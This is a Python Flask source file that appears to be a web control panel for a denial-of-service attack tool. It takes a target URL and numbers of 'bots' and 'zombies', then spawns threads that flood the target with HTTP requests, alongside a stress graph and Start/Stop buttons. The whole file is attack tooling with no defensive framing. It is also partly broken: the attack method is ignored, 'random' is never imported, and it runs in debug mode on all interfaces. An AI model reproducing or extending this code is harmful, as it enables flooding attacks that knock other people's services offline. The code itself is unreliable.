from flask import Flask, render_template, request
from flask_wtf import FlaskForm
from wtforms import SubmitField, SelectField, IntegerField, StringField
import threading
import requests
import time
import matplotlib.pyplot as plt

app = Flask(__name__, template_folder='templates')
app.config['SECRET_KEY'] = 'secret_key'

class AttackForm(FlaskForm):
    method = SelectField('Method', choices=[('L4', 'L4'), ('L7', 'L7'), ('VIP', 'VIP')])
    bots = IntegerField('Number of Bots')
    zombies = IntegerField('Number of Zombies')
    target_url = StringField('Target URL')
    submit_start = SubmitField('Start Attack')
    submit_stop = SubmitField('Stop Attack')

zombies = 0
bots = 0
attacking = False
target_url = ''
progress = 0
data = []

def attack(method):
    global attacking, target_url, progress, data
    attacking = True
    for _ in range(zombies):
        threading.Thread(target=send_attack, args=(target_url, method)).start()

def send_attack(url, method):
    global progress, data
    for _ in range(bots):
        if not attacking:
            break
        try:
            requests.get(url)  # Change request type according to the attack method
            progress += 1
            data.append(generate_data())
        except requests.exceptions.RequestException as e:
            print(f'Error in attack: {e}')

def update_progress(progress):
    bar_length = 50  # Length of the progress bar in characters
    block = int(round(bar_length * progress / 100))
    text = "\r[{}] {:.1f}%".format("=" * block + " " * (bar_length - block), progress)
    print(text, end="")

def generate_data():
    return random.randint(0, 100)

def plot_graph(data):
    plt.ion()
    plt.show()
    plt.xlabel("Time")
    plt.ylabel("Stress Level")
    plt.title("Real-Time Stress Graph")
    plt.plot(data)
    plt.draw()
    plt.pause(0.001)

@app.route('/', methods=['GET', 'POST'])
def index():
    form = AttackForm()
    global zombies, bots, attacking, target_url, progress, data

    if form.validate_on_submit():
        if form.submit_start.data:
            if not attacking:
                method = form.method.data
                zombies = form.zombies.data
                bots = form.bots.data
                target_url = form.target_url.data
                print(f'Starting attack with method: {method} on target URL: {target_url}')

                # Start a thread to update the progress bar
                progress_thread = threading.Thread(target=update_progress, args=(progress,))
                progress_thread.start()

                # Start a thread to generate and plot the real-time graph
                graph_thread = threading.Thread(target=plot_graph, args=(data,))
                graph_thread.start()

                threading.Thread(target=attack, args=(method,)).start()
            else:
                print('Attack already in progress.')
        elif form.submit_stop.data:
            attacking = False
            zombies = 0
            bots = 0
            print('Stopping attack.')

    return render_template('index.html', form=form)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8082, debug=True)
